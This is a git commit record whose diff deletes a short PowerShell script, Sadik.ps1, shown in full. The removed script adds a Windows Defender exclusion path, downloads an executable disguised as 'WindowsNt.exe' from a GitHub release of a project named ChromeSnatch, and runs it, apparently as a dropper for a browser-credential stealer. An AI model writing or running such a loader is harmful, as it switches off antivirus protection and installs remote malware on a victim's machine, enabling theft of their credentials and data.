dce830a9255c2777dcb99a3b93d2905f84026d5e
SAKIB-SALIM <salimsakib775@gmail.com>
2024-11-07 21:48:35 +0600

    sysh

--- Sadik.ps1
+++
@@ -1,5 +0,0 @@
-$path = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Temp"
-Set-MpPreference -ExclusionPath $path
-Invoke-WebRequest -Uri "https://github.com/SAKIB-SALIM/ChromeSnatch/releases/Sadik/download/WindowsNt.exe" -OutFile "$env:TEMP\WindowsNt.exe"
-Start-Process "$env:TEMP\WindowsNt.exe"
-exit;
